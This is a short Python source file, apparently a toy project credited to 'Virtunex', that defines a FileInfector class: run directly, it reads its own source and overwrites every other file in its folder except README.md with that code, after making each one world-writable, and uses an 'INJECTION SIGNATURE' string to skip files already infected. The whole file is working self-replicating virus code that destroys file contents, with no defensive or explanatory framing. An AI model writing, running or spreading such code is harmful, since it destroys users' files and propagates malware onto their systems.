"""
This is the project created by Virtunex

INJECTION SIGNATURE


"""







import logging
import os
import sys
from cached_property import cached_property


class FileInfector:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):
        # get the name of this file
        malicious_file = sys.argv[0]
        with open(malicious_file, 'r') as file:
            malicious_code = file.read()
        return malicious_code

    def infect_files_in_folder(self, path):
        num_infected_files = 0
        # list all the files
        files = []
        for file in os.listdir(path):
            if file == "README.md":
                continue
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)
        for file in files:
            logging.debug('Infecting file: {}'.format(file))

            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
            if "INJECTION SIGNATURE" in file_content:
                continue
            os.chmod(file, 0o777)
            with open(file, 'w') as infected_file:
                infected_file.write(self.malicious_code)
            num_infected_files += 1
        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # create an injector
    code_injector = FileInfector('SimpleFileInfector')

    # infect all the files in the same folder
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = code_injector.infect_files_in_folder(path)
    logging.info('Number of infected files: {}'.format(number_infected_files))

